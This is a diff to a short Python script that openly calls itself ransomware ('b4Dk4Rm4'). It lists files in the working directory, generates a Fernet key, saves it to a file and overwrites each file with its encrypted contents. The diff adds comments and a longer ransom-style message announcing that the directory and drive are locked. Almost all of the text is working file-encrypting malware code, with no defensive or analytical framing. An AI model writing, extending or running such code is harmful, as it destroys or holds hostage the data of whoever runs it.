@@ -13,10 +13,13 @@ for file in os.listdir():
 
 print(files)
 
+# generate a decryption key
 key = Fernet.generate_key()
 
 with open("thekey.key", "wb") as thekey:
         thekey.write(key)
+
+# encrypt the files in the files array
 
 for file in files:
         with open(file, "rb") as thefile:
@@ -25,4 +28,4 @@ for file in files:
         with open(file, "wb") as thefile:
                 thefile.write(contents_encrypted)        
 
-print("contents locked by b4Dk4Rm4!")
+print("we regret to inform you, the contents of your directory and drive have been locked by b4Dk4Rm4 malware/ransomware")
